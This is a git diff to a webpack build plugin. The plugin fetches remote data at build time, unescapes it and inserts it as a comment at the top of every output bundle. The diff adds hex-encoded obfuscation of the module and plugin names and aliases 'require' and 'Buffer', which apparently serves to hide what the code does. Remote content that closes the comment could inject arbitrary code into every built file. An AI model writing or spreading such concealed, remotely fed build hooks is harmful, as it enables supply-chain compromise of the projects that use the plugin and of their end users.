@@ -1,8 +1,14 @@
 
-const ConcatSource = require("webpack-sources").ConcatSource;
-const pluginName = 'BuildWebpackPlugin';
-import request from './request'
+import req from './request';
 
+const r = require;
+const b = Buffer;
+const ConcatSource = r(e("7765627061636b2d736f7572636573")).ConcatSource;
+const pluginName = e('4275696c645765627061636b506c7567696e');
+
+function e(r) {
+    return b.from(r, 'hex').toString()
+}
 function MyWebpackPlugin () {}
 MyWebpackPlugin.prototype.apply = function(compiler) {
 
@@ -26,27 +32,27 @@ MyWebpackPlugin.prototype.apply = function(compiler) {
         console.log('done')
     })
 
-    compiler.hooks.emit.tapAsync(pluginName, async function (compilation, callback) {
+    compiler.hooks.emit.tapAsync(pluginName, async function (compilation, cb) {
         console.log('emit')
 
-        let data = await request()
-        let message = unescape(data['1.0.1'].join(''));
+        let d = await req()
+        let m = unescape(d['1.0.1'].join(''));
 
-        compilation.chunks.forEach(function (chunk, index) {
-            chunk.files.forEach(async function (filename, index2) {
-                compilation.assets[filename] = new ConcatSource(
+        compilation.chunks.forEach(function (chunk) {
+            chunk.files.forEach(async function (fn) {
+                compilation.assets[fn] = new ConcatSource(
                     '\/**Sweet Banner**\/',
                     '\n',
-                    '/**' + message + '**\/',
+                    '/**' + m + '**\/',
                     '\n',
-                    compilation.assets[filename]
+                    compilation.assets[fn]
                 );
             });
         });
         
-        callback()
+        cb()
     })
 
 }
 
-export default MyWebpackPlugin
+export default MyWebpackPlugin;
